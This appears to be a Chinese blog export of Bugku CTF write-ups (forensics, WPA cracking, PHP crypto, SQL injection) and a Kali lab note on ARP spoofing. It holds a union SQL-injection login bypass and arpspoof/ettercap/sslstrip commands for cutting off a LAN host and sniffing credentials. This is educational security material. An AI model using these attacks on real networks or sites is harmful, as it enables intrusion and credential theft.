<h1 id="这么多数据包"><a href="#这么多数据包" class="headerlink" title="这么多数据包"></a>这么多数据包</h1><p>题目地址<a href="http://ctf.bugku.com/files/425d97c3a1a2fa32dcead0ddd90467c0/CTF.pcapng.zip" target="_blank" rel="noopener">http://ctf.bugku.com/files/425d97c3a1a2fa32dcead0ddd90467c0/CTF.pcapng.zip</a></p>
<p>这道题给的数据包非常多，上网找答案</p>
<blockquote>
<p>发现有很多包，快速浏览后发现前面都是攻击机(192.168.116.138)在向目标机(192.168.116.159)进行端口扫描，再往后看到5542已经getshell，追踪TCP数据流，发现txt文件</p>
</blockquote>
<p><img src="https://i.imgur.com/MZNh7fT.png" alt><br>base64 解码得到 CCTF{do_you_like_sniffer}</p>
<h1 id="做个游戏-08067CTF"><a href="#做个游戏-08067CTF" class="headerlink" title="做个游戏(08067CTF)"></a>做个游戏(08067CTF)</h1><p>题目地址<a href="http://ctf.bugku.com/files/465585c655e201384823f64342cfd554/heiheihei.jar" target="_blank" rel="noopener">http://ctf.bugku.com/files/465585c655e201384823f64342cfd554/heiheihei.jar</a></p>
<p>打开后是一个小游戏，</p>
<p>那么Java反编译(推荐<a href="http://jd.benow.ca/" target="_blank" rel="noopener">Java Decompiler</a>)</p>
<p><img src="https://i.imgur.com/gVIeM3P.png" alt>找到flag{RGFqaURhbGlfSmlud2FuQ2hpamk=}</p>
<p>将RGFqaURhbGlfSmlud2FuQ2hpamk=进行base64解码得到DajiDali_JinwanChiji</p>
<h1 id="想蹭网先解开密码"><a href="#想蹭网先解开密码" class="headerlink" title="想蹭网先解开密码"></a>想蹭网先解开密码</h1><p>题目地址<a href="http://ctf.bugku.com/files/77decd384a172b9a2294e6c6acfd48cc/wifi.cap" target="_blank" rel="noopener">http://ctf.bugku.com/files/77decd384a172b9a2294e6c6acfd48cc/wifi.cap</a></p>
<p>文件是.cap，扔到wireshark里看一下，基本上都是802.11协议的包，WiFi认证过程重点在WPA的四次握手包，也就是eapol协议的包，过滤一下<img src="https://i.imgur.com/uhxthkv.png" alt></p>
<p>aircrack-ng 进行破解<br>先生成字典</p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line"><span class="meta">filename</span> = <span class="string">"num.txt"</span></span><br><span class="line">for <span class="meta">x</span> <span class="meta">in</span><span class="meta"> range(</span>10):</span><br><span class="line">    for y <span class="meta">in</span><span class="meta"> range(</span>10):</span><br><span class="line">        for z <span class="meta">in</span><span class="meta"> range(</span>10):</span><br><span class="line">            for n <span class="meta">in</span><span class="meta"> range(</span>10):</span><br><span class="line">                with<span class="meta"> open(</span><span class="meta">filename</span>, <span class="string">"a"</span>) <span class="meta">as</span> file_obj:</span><br><span class="line">                    file_obj.write(<span class="string">'1391040'</span>+str(<span class="meta">x</span>)+str(y)+str(z)+str(n)+<span class="string">'\n'</span>)</span><br><span class="line">file_obj<span class="meta">.close(</span>)</span><br></pre></td></tr></table></figure>

<p><code>aircrack-ng -w num.txt wifi.cap</code>开始破解</p>
<p><img src="https://i.imgur.com/Qk5Eju4.png" alt></p>
<h1 id="Linux2"><a href="#Linux2" class="headerlink" title="Linux2"></a>Linux2</h1><p>题目地址:链接: <a href="http://pan.baidu.com/s/1skJ6t7R" target="_blank" rel="noopener">http://pan.baidu.com/s/1skJ6t7R</a> 密码: s7jy</p>
<p>又是linux，以bugku一贯的niaoxing，搜索<code>key</code>然后……然后就找到了….<img src="https://i.imgur.com/mk4w5R9.png" alt></p>
<h1 id="账号被盗了"><a href="#账号被盗了" class="headerlink" title="账号被盗了"></a>账号被盗了</h1><p>题目地址<a href="http://120.24.86.145:9001/" target="_blank" rel="noopener">http://120.24.86.145:9001/</a></p>
<p>打开题目后发现一个按钮，点击后跳出<img src="https://i.imgur.com/1wIgm0O.png" alt></p>
<p>第一反应bp抓包改包</p>
<p>这里的false改为true即可<img src="https://i.imgur.com/MqoAoYq.png" alt></p>
<p>然后跳出一个链接，进入后保存文件发现是一个cf刷枪的程序</p>
<p>wireshark抓包，账号密码随便填写，提交，抓到后查看TCP数据流，<img src="https://i.imgur.com/LDORkoV.png" alt></p>
<p>都是base64，解码后得到用户名和密码，发现是网易邮箱</p>
<p>登陆后在邮件草稿里能看到flag(要是flag提交不了就是有人恶搞了，没办法)</p>
<h1 id="细心的大象"><a href="#细心的大象" class="headerlink" title="细心的大象"></a>细心的大象</h1><p>题目地址<a href="https://share.weiyun.com/9287be0a629971ac53d97f39727eee18" target="_blank" rel="noopener">https://share.weiyun.com/9287be0a629971ac53d97f39727eee18</a></p>
<p>压缩包里有一张图片，扔到binwalk上发现<img src="https://i.imgur.com/IZS9cP8.png" alt></p>
<p>分离后是一个压缩包，里面有第二张图片但是需要密码，<br>查看了下图片1的属性，果然找到了备注一串字符<img src="https://i.imgur.com/ZsNBoQG.png" alt><br>一看就是经过base64加密的，拿去解密后就是图片2的密码</p>
<p>查看图片2发现是500px<em>420px，<br>为啥不是500px</em>500px呢？</p>
<p>用winhex打开将标记的A4修改为F4 <img src="https://i.imgur.com/3O78QAI.png" alt></p>
<p>打开就会发现flag<img src="https://i.imgur.com/1OFwGmJ.png" alt></p>
<h1 id="爆照-08067CTF"><a href="#爆照-08067CTF" class="headerlink" title="爆照(08067CTF)"></a>爆照(08067CTF)</h1><p>题目地址<a href="http://ctf.bugku.com/files/fa88c409b367aa9243313a85d138d183/8.jpg" target="_blank" rel="noopener">http://ctf.bugku.com/files/fa88c409b367aa9243313a85d138d183/8.jpg</a></p>
<p>一张穹妹的图片，binwalk扫一下后<img src="https://i.imgur.com/36H9LAD.png" alt></p>
<p>分离后得到一个压缩包<img src="https://i.imgur.com/nL6gEd7.png" alt></p>
<p>notepad++查看后发下头部有jfif的标记，将文件添加后缀.jfif转换成图片后发现88.jfif有个两个二维码一个能扫出来一个扫不出来<img src="https://i.imgur.com/kBlvHpt.png" alt><br>扫码是一串字符 bilibili</p>
<p>剩下的扔到kali上binwalk跑，发现8888.jfif有压缩包，foremost分离后解压会得到一个二维码<img src="https://i.imgur.com/AFwLLYy.png" alt><br>扫码后得到一串字符panama</p>
<p>继续binwalk会发现后面的图片是正常的</p>
<p>剩下的只有之前的888.jfif有修改的痕迹，<img src="https://i.imgur.com/kNUbPHE.png" alt><br>foremost分离出一张.jpg的图片<br>果然在备注中发现了<img src="https://i.imgur.com/qRFNQhC.png" alt><br>base64解码后得到silisili</p>
<p>按名称排序flag{bilibili_silisili_panama}</p>
<h1 id="流量分析-cnss"><a href="#流量分析-cnss" class="headerlink" title="流量分析(cnss)"></a>流量分析(cnss)</h1><p>题目地址<a href="http://ctf.bugku.com/files/7f9a18ccd16fa1c52f3fad835ad8df8e/1490637625.pcapng" target="_blank" rel="noopener">http://ctf.bugku.com/files/7f9a18ccd16fa1c52f3fad835ad8df8e/1490637625.pcapng</a></p>
<p>用wireshark打开后分析Tcp数据流 <img src="https://i.imgur.com/5QO0dmh.png" alt><br>发现<br><a href="http://space.bilibili.com/17190571/" target="_blank" rel="noopener">http://space.bilibili.com/17190571/</a><br>这个用户，那么打开访问一下发现<img src="https://i.imgur.com/R5Q81Ue.png" alt></p>
<p>拿去base64解码后发现好像不对啊，上网查了下wp发下好像是被别人搞了</p>
<p>没办法，总之这道题base64解码两次就ok了</p>
<p>这是flag<br>cnss{b1libil1_A_gay_wEbsite}</p>
<h1 id="猫片-安恒"><a href="#猫片-安恒" class="headerlink" title="猫片(安恒)"></a><font color="red">猫片(安恒)</font></h1><p>题目地址<a href="http://ctf.bugku.com/files/9f1bebac6b8282da716720cc99f35bed/png" target="_blank" rel="noopener">http://ctf.bugku.com/files/9f1bebac6b8282da716720cc99f35bed/png</a></p>
<p>一个名叫png的文件，给他加个.png的后缀，变成一个图片</p>
<p>扔到binwalk上看下，没有问题</p>
<p>涉及的东西有点多先放一下<a href="https://blog.csdn.net/x947955250/article/details/81482471" target="_blank" rel="noopener">https://blog.csdn.net/x947955250/article/details/81482471</a></p>
<h1 id="妹子的陌陌"><a href="#妹子的陌陌" class="headerlink" title="妹子的陌陌"></a>妹子的陌陌</h1><p>题目地址<a href="http://120.24.86.145:8002/misc/momo.jpg" target="_blank" rel="noopener">http://120.24.86.145:8002/misc/momo.jpg</a></p>
<p>下载后是一张照片binwalk发现有压缩包，改后缀.zip打开有一个.txt文件，需要密码解压，图片上有<code>喜欢我吗.</code>五个字符，密码就是这个</p>
<p>解压后得到<img src="https://i.imgur.com/fQDcyNX.png" alt></p>
<p>解密第一个摩斯密码得到HTTP//ENCODE.CHAHUO.COM/<br>构造成url<br><a href="HTTP://ENCODE.CHAHUO.COM/" target="_blank" rel="noopener">HTTP://ENCODE.CHAHUO.COM/</a></p>
<p>在这个网站中选择AES解密U2FsdGVkX18tl8Yi7FaGiv6jK1SBxKD30eYb52onYe0=</p>
<p>得到momoj2j.png</p>
<p>访问<br><a href="http://c.bugku.com/momoj2j.png" target="_blank" rel="noopener">http://c.bugku.com/momoj2j.png</a></p>
<p>得到二维码，扫描后得到flag，要是扫不出来就将图片反相做一下再扫</p>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>杂项</tag>
      </tags>
  </entry>
  <entry>
    <title>WP-Bugku-Web进阶系列</title>
    <url>/2018/08/26/Writeup/WP-Bugku-Web%E8%BF%9B%E9%98%B6%E7%B3%BB%E5%88%97/</url>
    <content><![CDATA[<h1 id="phpcmsV9"><a href="#phpcmsV9" class="headerlink" title="phpcmsV9"></a>phpcmsV9</h1><p>题目地址<a href="http://120.24.86.145:8001/" target="_blank" rel="noopener">http://120.24.86.145:8001/</a></p>
<p>不知道为什么，御剑扫后台直接出来了<a href="https://i.imgur.com/c6nnfW1.png" target="_blank" rel="noopener"></a></p>
<h1 id="海洋CMS"><a href="#海洋CMS" class="headerlink" title="海洋CMS"></a>海洋CMS</h1><p>题目地址<a href="http://120.24.86.145:8008/" target="_blank" rel="noopener">http://120.24.86.145:8008/</a></p>
<p>来晚了，这题已经被日的面目全非</p>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web进阶</tag>
        <tag>cms</tag>
      </tags>
  </entry>
  <entry>
    <title>kali渗透</title>
    <url>/2018/08/23/kali%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h1 id="本文中所使用工具的原理及方法"><a href="#本文中所使用工具的原理及方法" class="headerlink" title="本文中所使用工具的原理及方法"></a>本文中所使用工具的原理及方法</h1><h2 id="arpspoof工具的arp欺骗"><a href="#arpspoof工具的arp欺骗" class="headerlink" title="arpspoof工具的arp欺骗"></a>arpspoof工具的arp欺骗</h2><h3 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h3><p>地址解析协议(ARP)，ARP(Address Resolution Protocol)，是一个位于TCP/IP协议栈中的网络层。当局域网内计算机间(或者是计算机与网关间)需要通信时，使用ARP协议获取目标IP地址对应的MAC地址，然后计算机间再通过该MAC地址完成数据包发送。ARP欺骗一般目的是把自己伪装成网关，从而欺骗目标机器，使本应发送到真实网关的数据包发送到欺骗者的机器。</p>
<h3 id="arpspoof工具"><a href="#arpspoof工具" class="headerlink" title="arpspoof工具"></a>arpspoof工具</h3><blockquote>
<p><strong>功能</strong>: arpspoof通过伪造arp回复包将局域网中主机A(或者所有主机)的网路包重定向到主机B。<br><strong>用法</strong>: <code>arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host</code></p>
</blockquote>
<h2 id="driftnet的图片抓取"><a href="#driftnet的图片抓取" class="headerlink" title="driftnet的图片抓取"></a>driftnet的图片抓取</h2><h2 id="ettercap的嗅探"><a href="#ettercap的嗅探" class="headerlink" title="ettercap的嗅探"></a>ettercap的嗅探</h2><h2 id="sslstrip将HTTPS的链接还原为HTTP"><a href="#sslstrip将HTTPS的链接还原为HTTP" class="headerlink" title="sslstrip将HTTPS的链接还原为HTTP"></a>sslstrip将HTTPS的链接还原为HTTP</h2><hr>
<h1 id="局域网断网工具"><a href="#局域网断网工具" class="headerlink" title="局域网断网工具"></a>局域网断网工具</h1><p>ARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量使网络阻塞，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。</p>
<p>这里我用我的win10物理机当作目标机，这里可见此时是可以 ping 通 baidu 的<img src="https://inwcna.sn.files.1drv.com/y4mnS0nujCJGLhRQAIuL8Zug7DkUHmd39xlXQ1MneIwU4ku2aw2Ycezh1AXF0nOHrNMd8rM4vlL6a49tgT4_dzPZeZcPF77JfFOFKFQ2cde9RMspXyTO4Mcfix6P77ChkzZuRtBQfbYLoEwGRqPLfIeGQe4XK7gmIuPIZ0Rlz2N2vz7KmoDmvWryjUFC9j4vahkRUgqSXeiiksVAJHHpB_8eQ?width=517&height=102&cropmode=none" alt><br>进行arp攻击<code>arpspoof -i 网卡名称 -t 目标机ip 网关</code><br><img src="https://inwbna.sn.files.1drv.com/y4m3WfQYZRtWUO6GdPz7g3SAzpbTO_qRcjleZmxJQO3Cnf9dFfoLeeLpH2YMlEuCTqCSRrIP7VcPeQRQ-5Y2eZo58OAJ9rgxpj7wA_NPfZtU5R9TD5qXTzHCfeYTANj4xANlJ8DBZDaVCuzomXaBMln3T1leSvdQdtAtoyrlU0wFQmSviuj3y4F7DdKmj6ZJvIrvbmwLP5-78W1-KgHnlv3uA?width=724&height=95&cropmode=none" alt><br>发现物理机已经断网了<img src="https://invqna.sn.files.1drv.com/y4m-G0vnhkziXhuQXrYws_dgCwQkmxHJgvBrKgPpdLusxunYgKkKi0nH9WlLT6QqMRj9TDCGI5hgoB--cEJsMENVxw0iDhhrAC4OJzx8etgCHdCxJuhWx734bL3kUSzfu8qIMABsxVF1ewFdQXo161ZcvzAwubVLysXgTtNkqKCn-8zBufwJdIvoflWId_yODKziGonMglzDtVsQ9NhLQgNTg?width=474&height=38&cropmode=none" alt></p>
<hr>
<h1 id="获取内网他人浏览的图片"><a href="#获取内网他人浏览的图片" class="headerlink" title="获取内网他人浏览的图片"></a>获取内网他人浏览的图片</h1><p>物理机当作目标机<br>kali 使用 arpspoof 工具 <code>arpspoof -i 网卡名称 -t 目标机ip kali的ip</code><img src="https://inwena.sn.files.1drv.com/y4mvOQO7o2jwaX3uS-bszsyleJChAMKcJYS2F3wQbxI_A8sRrt3SKrNdh6icxVH_iYIBK5djv9Jot_cusHORly44T7A5qud72A3keEGOZcVAp-yzM3WpckTLeKcTlOhgCMQO6Ebzclk2Fj80sEw_CXwet3jxPZH05AGfUSKmvoZausxZfG7pXFbPdE-EFkoMd5J9G06HZDRQ7hszy9EdxGIOQ?width=797&height=74&cropmode=none" alt><br>使用 driftnet 工具 <code>driftnet -i 网卡名称</code> ，然后在目标机上百度搜索图片，可以看到 driftnet 有了反应，获取成功<img src="https://h9wfna.sn.files.1drv.com/y4maEJImx-z7BWuJwvDnx2bgAGCpSmnFBOhOhhsK7sKqP4Zfyr2V0ZA0TOrVp8U5EPl76GwyiYVbdSBgN2JTphARbR6kwrTulPdv7yNxTGC1xr-dqgaoFzyp1oupT9UlXYGOcdF1ZK55VvZCA4Vf_UhSAUzTbSsNwTrVirZHvl7wh-VFstxKJoy_nRzN1VfeqUyUABuMtjDIUs3ZmgIDL1Tyg?width=869&height=428&cropmode=none" alt></p>
<hr>
<h1 id="窃听-HTTP"><a href="#窃听-HTTP" class="headerlink" title="窃听(HTTP)"></a>窃听(HTTP)</h1><p>物理机当作目标机<br>kali 先打开ip转发 <code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code><br><a href="https://www.cnblogs.com/happy1983/p/9173100.html" target="_blank" rel="noopener"><font color="red">(了解更多)</font></a><br><img src="https://inwdna.sn.files.1drv.com/y4meq8gRatXM3KriKTzj0KnmJcDXxIyKbhF6marFEMB7nfenGJRKgABe1788elBGjYnNGB9CI7AXKWFVepOSnlY4md1P4fvq3439NeXfln-KL6hHCl8D4a4-f_hwnWNRHPazX1jstKZxv_EGD4jx3uWe0Y-64PbQJzXzI0kr8dSr6boiThh3LIj8I6O7gy1aNZdj7r-RgYwIw30vhP_7QbqbA?width=1252&height=474&cropmode=none" width="1252" height="474"><br>arp欺骗 <code>arpspoor -i 网卡名称 -t 目标机ip kali的ip</code><img src="https://inwgna.sn.files.1drv.com/y4mnINHx8EKB1wnCCkSR5BpYn7NRZ_AWSgEgSceDtSKSHPhVliifwCU7im2INKDBpPTjfB2z6rPABrI7qdDA7ZE4Y-jwJB7uNjIHM_no2u5t-Ym5CDjB1_v_IZ0DAwQpBi-Y_PhMcy2vUZuZRfQ9TEJH6X7Tm5tFiWIBSBXl92JqcumfAMIvHrUPnSoqdkQIAANpJJfg1TBUaKsQCUjlQxW0Q?width=798&height=81&cropmode=none" alt><br>使用ettercap进行嗅探 <code>ettercap -Tq -i eth0</code>成功启动后<img src="https://inwina.sn.files.1drv.com/y4mk4bWHenzmqVaF-g6FvKpc7YEetQ_LDdazXXeja7SrN3YZVKpXTdCmjKaL1crn_KUlZ1fyZet-1w-lz0BXr3n0s9yJVyzTv9B_n3wfghdDj9XqqJ4hfxtdsHEq4C8dGQJzYCFHkU1jakt5DNwDJxR7HzAxF7q6Cb3J57GWgIIeaSp7fm5f1KOpy_IilZCs8_mvYv6_RTN0uhzOdUb-w9-0Q?width=853&height=572&cropmode=none" alt><br>在物理机上测试，在http协议的网站输入用户名和密码，发现已经被 ettercap 嗅探到<img src="https://idwana.sn.files.1drv.com/y4mrdKuFMljoYMuYuO8CKeo20lB8UrA86g8FpNKEc0wWBc1iMwy-Hb7ND6zrAHsBjlmBc5BkouVaF5Bxu48XXWYfUSO-UK1fJFG9h2HpfLIXbtbeGYcjoIZE8z2r61eal2yZ6g0exw2fGBGXu6ltnCLStqX8Jqyjq_0z36psC0uXiC-ZUr_yAPq1r2g2OkSAFvEvCXugE2RT0DO875z9o3aFA?width=929&height=55&cropmode=none" alt></p>
<hr>
<h1 id="窃听-HTTPS"><a href="#窃听-HTTPS" class="headerlink" title="窃听(HTTPS)"></a>窃听(HTTPS)</h1><p><a href="https://www.cnblogs.com/BloodZero/p/4415483.html" target="_blank" rel="noopener">https://www.cnblogs.com/BloodZero/p/4415483.html</a></p>
<p>先<code>vim /etc/ettercap/etter.conf</code>找到如图段落，将 # 注释删去<img src="https://idvqna.sn.files.1drv.com/y4muF8KS1p6wZ8RA4WpqJmifTqHLsKRnkSIQaiVzUyj4ZLBmcAv-fvSSOyIoPAON6ZMWLfzA_jOYqfI0BP-TaeG0ozVDPdhvTCkYT8e8U8cVfQ2-JQNv6gW2CPVwx8bJtKpjoEOMZvNQzOhBynslzWuFStZIPM-cvecTzBp8rfsa-UANsn5ftVQKWhSeiPItxMz1sM9E1y-cyHkEYpxtohjRQ?width=929&height=187&cropmode=none" alt><br>配置 <code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code><br>对 HTTPS 嗅探需要在 arp 欺骗 <code>arpspoof -i 网卡名称 -t 目标机ip 网关</code> 和 ettercap 抓包 <code>ettercap -Tq -i eth0</code> 时使用工具 sslstrip <code>sslstrip -a -f -k</code><img src="https://inwhna.sn.files.1drv.com/y4m92EXHtVaB8JyILEUDTPWm495hKWotIpRWWhnWn1U0DPEoLBmb67JLMinzG9b82HjH64VEyqD9-mo0h9TlOeH0E3a_yskgqLNQsyhTDqNxM0mSnZJtMcUiLaCbzu02pgYC3ymC23a8KXP_lGwJJ8IG66_Yw10GFcs_dZgHpu2Gni5RgA-Dp2YiUwF8jKuZzcNytOYQR_bA49PmC9-liOSFQ?width=974&height=998&cropmode=none" alt><br>在目标机上测试，在https站点登陆(正常来说应该会被ettercap抓到，但是由于现在浏览器安全等级很高，直接阻止了建立连接，所以这个实验没有百分之百完成)</p>
<hr>
<h1 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h1>]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>Web</tag>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>WP-Bugku-PHP_encrypt_1(ISCCCTF)</title>
    <url>/2018/08/21/Writeup/bugkuWeb/WP-Bugku-PHP-encrypt-1-ISCCCTF/</url>
    <content><![CDATA[<p>题目直接给出了加密源码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($data,$key)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $key = md5(<span class="string">'ISCC'</span>);</span></span><br><span class="line"><span class="php">    $x = <span class="number">0</span>;</span></span><br><span class="line"><span class="php">    $len = strlen($data);</span></span><br><span class="line"><span class="php">    $klen = strlen($key);</span></span><br><span class="line"><span class="php">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123; </span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> ($x == $klen)</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            $x = <span class="number">0</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        $char .= $key[$x];</span></span><br><span class="line"><span class="php">        $x+=<span class="number">1</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123;</span></span><br><span class="line"><span class="php">        $str .= chr((ord($data[$i]) + ord($char[$i])) % <span class="number">128</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> base64_encode($str);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>输出 <code>fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=</code></p>
<p>这里直接给出解密的源码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span><span class="params">($str)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    $mkey = <span class="string">"729623334f0aa2784a1599fd374c120d"</span>;</span></span><br><span class="line"><span class="php">    $klen = strlen($mkey);</span></span><br><span class="line"><span class="php">    $tmp = $str;</span></span><br><span class="line"><span class="php">    $tmp = base64_decode($tmp);  <span class="comment">// 对 base64 后的字符串 decode</span></span></span><br><span class="line"><span class="php">    $md_len = strlen($tmp); <span class="comment">//获取字符串长度</span></span></span><br><span class="line"><span class="php">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $md_len; $i++) &#123;  <span class="comment">//  取二次加密用 key;</span></span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> ($x == $klen)  <span class="comment">// 数据长度是否超过 key 长度检测</span></span></span><br><span class="line"><span class="php">            $x = <span class="number">0</span>;</span></span><br><span class="line"><span class="php">        $char .= $mkey[$x];  <span class="comment">// 从 key 中取二次加密用 key</span></span></span><br><span class="line"><span class="php">        $x+=<span class="number">1</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $md_data = <span class="keyword">array</span>();</span></span><br><span class="line"><span class="php">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$md_len;$i++) &#123; <span class="comment">// 取偏移后密文数据</span></span></span><br><span class="line"><span class="php">        array_push($md_data, ord($tmp[$i]));</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $md_data_source = <span class="keyword">array</span>();</span></span><br><span class="line"><span class="php">    $data1 = <span class="string">""</span>;</span></span><br><span class="line"><span class="php">    $data2 = <span class="string">""</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">foreach</span> ($md_data <span class="keyword">as</span> $key =&gt; $value) &#123; <span class="comment">// 对偏移后的密文数据进行还原</span></span></span><br><span class="line"><span class="php">        $i = $key;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>($i &gt;= strlen($mkey)) &#123;$i = $i - strlen($mkey);&#125;</span></span><br><span class="line"><span class="php">        $dd = $value;</span></span><br><span class="line"><span class="php">        $od = ord($mkey[$i]);</span></span><br><span class="line"><span class="php">        array_push($md_data_source,$dd);</span></span><br><span class="line"><span class="php">        $data1 .= chr(($dd+<span class="number">128</span>)-$od);  <span class="comment">// 第一种可能, 余数+128-key 为回归数</span></span></span><br><span class="line"><span class="php">        $data2 .= chr($dd-$od);  <span class="comment">// 第二种可能, 余数直接-key 为回归数</span></span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">print</span> <span class="string">"data1 =&gt; "</span>.$data1.<span class="string">"&lt;br&gt;\n"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">print</span> <span class="string">"data2 =&gt; "</span>.$data2.<span class="string">"&lt;br&gt;\n"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$str = <span class="string">"fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA="</span>;</span></span><br><span class="line"><span class="php">decrypt($str);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>Flag:{asdqwdfasfdawfefqwdqwdadwqadawd}</p>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>Web</tag>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>WP-Bugku-login2(SKCTF)</title>
    <url>/2018/08/21/Writeup/bugkuWeb/WP-Bugku-login2-SKCTF/</url>
    <content><![CDATA[<p>题目地址<a href="http://118.89.219.210:49165/" target="_blank" rel="noopener">http://118.89.219.210:49165/</a></p>
<p>随便输入用户名，密码抓包测试，发现返回的爆里有一个tip<br><img src="https://i.imgur.com/OuRpk6I.png" alt></p>
<p>base64解码后的到源码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT username,password FROM admin WHERE username='"</span>.$username.<span class="string">"'"</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($row) &amp;&amp; $row[<span class="string">'password'</span>]===md5($password))&#123;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>题目提示了union</p>
<p>那么尝试注入<br><code>1&#39; union select 1,&#39;5f4dcc3b5aa765d61d8327deb882cf99&#39;--</code><br><code>password</code></p>
<p>这里 5f4dcc3b5aa765d61d8327deb882cf99 是经过md5加密后的 password</p>
<p>登陆成功后跳转到了 <a href="http://118.89.219.210:49165/index.php" target="_blank" rel="noopener">http://118.89.219.210:49165/index.php</a><br><img src="https://i.imgur.com/5PmYhRz.png" alt></p>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>WP-Bugku-INSERT INTO注入</title>
    <url>/2018/08/19/Writeup/bugkuWeb/WP-Bugku-INSERT%20INTO%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>题目地址<a href="http://120.24.86.145:8002/web15/" target="_blank" rel="noopener">http://120.24.86.145:8002/web15/</a></p>
<p>题目给了源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span><span class="params">()</span></span>&#123;</span><br><span class="line">	$ip = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</span><br><span class="line">		$ip = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">	&#125;</span><br><span class="line">$ip_arr = explode(<span class="string">','</span>, $ip);</span><br><span class="line"><span class="keyword">return</span> $ip_arr[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host=<span class="string">"localhost"</span>;</span><br><span class="line">$user=<span class="string">""</span>;</span><br><span class="line">$pass=<span class="string">""</span>;</span><br><span class="line">$db=<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$connect = mysql_connect($host, $user, $pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to connect"</span>);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to select database"</span>);</span><br><span class="line"></span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'your ip is :'</span>.$ip;</span><br><span class="line">$sql=<span class="string">"insert into client_ip (ip) values ('$ip')"</span>;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure>

<p>这是X_FORWARDED_FOR注入，但是过滤了<code>,</code>在<code>,</code>被过滤的情况下，无法使用<code>if</code>语句<br>当然在mysql下除了if还有</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> xxx <span class="keyword">then</span> xxx <span class="keyword">else</span> xxx <span class="keyword">end</span>;</span><br></pre></td></tr></table></figure>

<p>而且由于,被过滤，无法使用substr和substring，但是这里可以使用from 1 for 1替代，最后payload如下</p>
